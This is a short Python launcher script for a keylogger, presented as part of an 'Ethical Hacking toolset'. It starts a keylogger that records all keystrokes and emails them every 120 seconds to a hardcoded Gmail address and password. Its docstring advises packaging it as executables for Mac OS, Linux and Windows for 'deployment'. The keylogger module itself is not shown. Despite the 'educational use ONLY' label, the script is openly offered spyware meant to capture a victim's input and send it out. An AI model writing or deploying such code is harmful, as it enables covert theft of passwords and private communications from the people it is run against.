#!/usr/bin/python
import keylogger

'''
Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
The keylogger takes the all key strikes on keyboard and send them to an email every specific period of time
Requirements: You need only to install pynput
          		'pip install pynput'
          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
Enjoy!
'''

#Main program
my_keylogger = keylogger.Keylogger(120, "JohnDoe77@gmail.com", "johndoe77")
my_keylogger.start()